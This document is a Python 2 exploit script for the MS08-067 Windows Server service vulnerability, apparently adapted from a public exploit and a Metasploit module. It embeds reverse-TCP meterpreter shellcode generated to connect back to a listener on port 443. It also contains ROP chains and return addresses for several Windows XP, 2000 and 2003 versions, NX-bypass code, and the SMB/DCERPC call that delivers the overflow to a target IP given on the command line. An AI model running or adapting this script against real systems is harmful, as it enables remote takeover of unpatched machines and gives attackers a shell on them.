import struct
import time
import sys


from threading import Thread    #Thread is imported incase you would like to modify


try:

    from impacket import smb

    from impacket import uuid

    from impacket import dcerpc

    from impacket.dcerpc.v5 import transport


except ImportError, _:

    print 'Install the following library to make this script work'

    print 'Impacket : http://oss.coresecurity.com/projects/impacket.html'

    print 'PyCrypto : http://www.amk.ca/python/code/crypto.html'

    sys.exit(1)


print '#######################################################################'

print '#   MS08-067 Exploit'

print '#   This is a modified verion of Debasis Mohanty\'s code (https://www.exploit-db.com/exploits/7132/).'

print '#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi'

print '#######################################################################\n'


#Reverse TCP shellcode from metasploit; port 443 IP 192.168.40.103; badchars \x00\x0a\x0d\x5c\x5f\x2f\x2e\x40;
#Make sure there are enough nops at the begining for the decoder to work. Payload size: 380 bytes (nopsleps are not included)
#EXITFUNC=thread Important!
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.77 LPORT=443  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python
shellcode="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode+="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += "\x29\xc9\x83\xe9\xa7\xe8\xff\xff\xff\xff\xc0\x5e\x81"
shellcode += "\x76\x0e\xc4\x15\xf1\x33\x83\xee\xfc\xe2\xf4\x38\xfd"
shellcode += "\x73\x33\xc4\x15\x91\xba\x21\x24\x31\x57\x4f\x45\xc1"
shellcode += "\xb8\x96\x19\x7a\x61\xd0\x9e\x83\x1b\xcb\xa2\xbb\x15"
shellcode += "\xf5\xea\x5d\x0f\xa5\x69\xf3\x1f\xe4\xd4\x3e\x3e\xc5"
shellcode += "\xd2\x13\xc1\x96\x42\x7a\x61\xd4\x9e\xbb\x0f\x4f\x59"
shellcode += "\xe0\x4b\x27\x5d\xf0\xe2\x95\x9e\xa8\x13\xc5\xc6\x7a"
shellcode += "\x7a\xdc\xf6\xcb\x7a\x4f\x21\x7a\x32\x12\x24\x0e\x9f"
shellcode += "\x05\xda\xfc\x32\x03\x2d\x11\x46\x32\x16\x8c\xcb\xff"
shellcode += "\x68\xd5\x46\x20\x4d\x7a\x6b\xe0\x14\x22\x55\x4f\x19"
shellcode += "\xba\xb8\x9c\x09\xf0\xe0\x4f\x11\x7a\x32\x14\x9c\xb5"
shellcode += "\x17\xe0\x4e\xaa\x52\x9d\x4f\xa0\xcc\x24\x4a\xae\x69"
shellcode += "\x4f\x07\x1a\xbe\x99\x7d\xc2\x01\xc4\x15\x99\x44\xb7"
shellcode += "\x27\xae\x67\xac\x59\x86\x15\xc3\xea\x24\x8b\x54\x14"
shellcode += "\xf1\x33\xed\xd1\xa5\x63\xac\x3c\x71\x58\xc4\xea\x24"
shellcode += "\x59\xce\x7d\xfb\x38\xc4\x93\x99\x31\xc4\x04\xad\xba"
shellcode += "\x22\x45\xa1\x63\x94\x55\xa1\x73\x94\x7d\x1b\x3c\x1b"
shellcode += "\xf5\x0e\xe6\x53\x7f\xe1\x65\x93\x7d\x68\x96\xb0\x74"
shellcode += "\x0e\xe6\x41\xd5\x85\x39\x3b\x5b\xf9\x46\x28\xfd\x90"
shellcode += "\x33\xc4\x15\x9b\x33\xae\x11\xa7\x64\xac\x17\x28\xfb"
shellcode += "\x9b\xea\x24\xb0\x3c\x15\x8f\x05\x4f\x23\x9b\x73\xac"
shellcode += "\x15\xe1\x33\xc4\x43\x9b\x33\xac\x4d\x55\x60\x21\xea"
shellcode += "\x24\xa0\x97\x7f\xf1\x65\x97\x42\x99\x31\x1d\xdd\xae"
shellcode += "\xcc\x11\x96\x09\x33\xb9\x37\xa9\x5b\xc4\x55\xf1\x33"
shellcode += "\xae\x15\xa1\x5b\xcf\x3a\xfe\x03\x3b\xc0\xa6\x5b\xb1"
shellcode += "\x7b\xbc\x52\x3b\xc0\xaf\x6d\x3b\x19\xd5\xda\xb5\xea"
shellcode += "\x0e\xcc\xc5\xd6\xd8\xf5\xb1\xd2\x32\x88\x24\x08\xdb"
shellcode += "\x39\xac\xb3\x64\x8e\x59\xea\x24\x0f\xc2\x69\xfb\xb3"
shellcode += "\x3f\xf5\x84\x36\x7f\x52\xe2\x41\xab\x7f\xf1\x60\x3b"
shellcode += "\xc0\xf1\x33"


nonxjmper = "\x08\x04\x02\x00%s"+"A"*4+"%s"+"A"*42+"\x90"*8+"\xeb\x62"+"A"*10
disableNXjumper = "\x08\x04\x02\x00%s%s%s"+"A"*28+"%s"+"\xeb\x02"+"\x90"*2+"\xeb\x62"
ropjumper = "\x00\x08\x01\x00"+"%s"+"\x10\x01\x04\x01";
module_base = 0x6f880000
def generate_rop(rvas):
	gadget1="\x90\x5a\x59\xc3"  
	gadget2 = ["\x90\x89\xc7\x83", "\xc7\x0c\x6a\x7f", "\x59\xf2\xa5\x90"]	
	gadget3="\xcc\x90\xeb\x5a"	
	ret=struct.pack('<L', 0x00018000)
	ret+=struct.pack('<L', rvas['call_HeapCreate']+module_base)
	ret+=struct.pack('<L', 0x01040110)
	ret+=struct.pack('<L', 0x01010101)
	ret+=struct.pack('<L', 0x01010101)
	ret+=struct.pack('<L', rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret']+module_base)
	ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
	ret+=gadget1
	ret+=struct.pack('<L', rvas['mov [eax], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['jmp eax']+module_base)
	ret+=gadget2[0]
	ret+=gadget2[1]
	ret+=struct.pack('<L', rvas['mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
	ret+=gadget2[2]
	ret+=struct.pack('<L', rvas['mov [eax+0x10], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['add eax, 8 / ret']+module_base)
	ret+=struct.pack('<L', rvas['jmp eax']+module_base)
	ret+=gadget3	
	return ret
class SRVSVC_Exploit(Thread):

    def __init__(self, target, os, port=445):

        super(SRVSVC_Exploit, self).__init__()

        self.__port   = port

        self.target   = target
	self.os	      = os


    def __DCEPacket(self):
	if (self.os=='1'):
		print 'Windows XP SP0/SP1 Universal\n'
		ret = "\x61\x13\x00\x01"
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='2'):
		print 'Windows 2000 Universal\n'
		ret = "\xb0\x1c\x1f\x00"
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='3'):
		print 'Windows 2003 SP0 Universal\n'
		ret = "\x9e\x12\x00\x01"  #0x01 00 12 9e
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='4'):
		print 'Windows 2003 SP1 English\n'
		ret_dec = "\x8c\x56\x90\x7c"  #0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
		ret_pop = "\xf4\x7c\xa2\x7c"  #0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
		jmp_esp = "\xd3\xfe\x86\x7c" #0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
		disable_nx = "\x13\xe4\x83\x7c" #0x 7c 83 e4 13 NX disable @NTDLL.DLL
		jumper = disableNXjumper % (ret_dec*6, ret_pop, disable_nx, jmp_esp*2)
	elif (self.os=='5'):
		print 'Windows XP SP3 French (NX)\n'
		ret = "\x07\xf8\x5b\x59"  #0x59 5b f8 07 
		disable_nx = "\xc2\x17\x5c\x59" #0x59 5c 17 c2 
		jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
	elif (self.os=='6'):
		print 'Windows XP SP3 English (NX)\n'
		ret = "\x07\xf8\x88\x6f"  #0x6f 88 f8 07 
		disable_nx = "\xc2\x17\x89\x6f" #0x6f 89 17 c2 
		jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
	elif (self.os=='7'):
		print 'Windows XP SP3 English (AlwaysOn NX)\n'
		rvasets = {'call_HeapCreate': 0x21286,'add eax, ebp / mov ecx, 0x59ffffa8 / ret' : 0x2e796,'pop ecx / ret':0x2e796 + 6,'mov [eax], ecx / ret':0xd296,'jmp eax':0x19c6f,'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret':0x10a56,'mov [eax+0x10], ecx / ret':0x10a56 + 6,'add eax, 8 / ret':0x29c64}
		jumper = generate_rop(rvasets)+"AB"  #the nonxjmper also work in this case.
	else:
		print 'Not supported OS version\n'
		sys.exit(-1)
	print '[-]Initiating connection'

        self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)

        self.__trans.connect()

        print '[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target

        self.__dce = self.__trans.DCERPC_class(self.__trans)

        self.__dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))




        path ="\x5c\x00"+"ABCDEFGHIJ"*10 + shellcode +"\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00" + "\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00"  + jumper + "\x00" * 2

        server="\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
        prefix="\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"

        self.__stub=server+"\x36\x01\x00\x00\x00\x00\x00\x00\x36\x01\x00\x00" + path +"\xE8\x03\x00\x00"+prefix+"\x01\x10\x00\x00\x00\x00\x00\x00"

        return



    def run(self):

        self.__DCEPacket()

        self.__dce.call(0x1f, self.__stub) 
        time.sleep(5)
        print 'Exploit finish\n'



if __name__ == '__main__':

       try:

           target = sys.argv[1]
	   os = sys.argv[2]

       except IndexError:

				print '\nUsage: %s <target ip>\n' % sys.argv[0]

				print 'Example: MS08_067.py 192.168.1.1 1 for Windows XP SP0/SP1 Universal\n'
				print 'Example: MS08_067.py 192.168.1.1 2 for Windows 2000 Universal\n'

				sys.exit(-1)



current = SRVSVC_Exploit(target, os)

current.start()


